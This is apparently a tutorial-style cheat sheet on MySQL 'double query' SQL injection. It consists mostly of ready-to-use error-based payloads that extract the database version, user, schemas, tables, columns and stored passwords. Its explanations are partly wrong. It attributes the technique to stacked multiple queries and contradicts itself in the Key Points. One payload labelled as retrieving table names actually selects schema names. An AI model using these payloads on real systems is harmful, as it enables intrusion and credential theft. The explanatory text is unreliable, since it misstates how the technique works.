
## Double Query Injection

**Double Query Injection** is a type of SQL injection that leverages the ability of MySQL versions prior to 5.7 to execute multiple queries in a single request. This technique involves injecting multiple SQL statements into a vulnerable input field, and can be used to retrieve database information through error messages.

### Prerequisites

- **MySQL Version**: The double query injection technique is applicable to MySQL versions less than 5.7, as these versions allow executing multiple queries in a single request.

### Techniques and Examples

Double query injection involves injecting queries that generate errors containing useful information. The goal is to cause the database to produce an error message that includes the output of the injected queries.

1. **Retrieve MySQL Version**
   ```sql
   1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT version()), 0x3a, 0x3a, FLOOR(RAND()*2)) a FROM information_schema.columns GROUP BY a) b) --+
   ```
   - **Description**: This query causes an error message to print the MySQL version by concatenating it with random data to ensure it is included in the error message.

2. **Retrieve Database Name**
   ```sql
   1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT database()), 0x3a, 0x3a, FLOOR(RAND()*2)) a FROM information_schema.columns GROUP BY a) b) --+
   ```
   - **Description**: This query prints the name of the current database by including it in the error message.

3. **Retrieve Current User**
   ```sql
   1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT user()), 0x3a, 0x3a, FLOOR(RAND()*2)) a FROM information_schema.columns GROUP BY a) b) --+
   ```
   - **Description**: This query prints the current database user by including it in the error message.

4. **Retrieve Database Names**
   ```sql
   1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT table_schema FROM information_schema.tables GROUP BY table_schema LIMIT 0,1), 0x3a, 0x3a, FLOOR(RAND()*2)) a FROM information_schema.columns GROUP BY a) b) --+
   ```
   - **Description**: This query prints the name of the first database schema by using `LIMIT` to restrict the result to the first entry.

5. **Retrieve Table Names in a Specific Database**
   ```sql
   1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT table_schema FROM information_schema.tables WHERE table_schema = "employe_db" LIMIT 0,1), 0x3a, 0x3a, FLOOR(RAND()*2)) a FROM information_schema.columns GROUP BY a) b) --+
   ```
   - **Description**: This query prints the name of a table in the specified database (`employe_db`) by using `LIMIT` to restrict the result to the first entry.

6. **Retrieve Column Names from a Specific Table**
   ```sql
   1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='employe_db' LIMIT 0,1), 0x3a, 0x3a, FLOOR(RAND()*2)) a FROM information_schema.columns GROUP BY a) b) --+
   ```
   - **Description**: This query prints the name of a column in the `users` table within the `employe_db` database.

7. **Retrieve Password from a User Table**
   ```sql
   1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, 0x3a, (SELECT password FROM courses.users LIMIT 0,1), 0x3a, 0x3a, FLOOR(RAND()*2)) a FROM information_schema.columns GROUP BY a) b) --+
   ```
   - **Description**: This query prints the password from the `users` table in the `courses` database.

### Key Points

- **Error-based Information Retrieval**: Unlike traditional error-based SQL injection, which focuses on causing errors to obtain information, double query injection aims to inject and execute multiple queries to retrieve database information from error messages.
- **MySQL Version**: This technique is effective on MySQL versions prior to 5.7 due to their support for executing multiple queries in a single request.

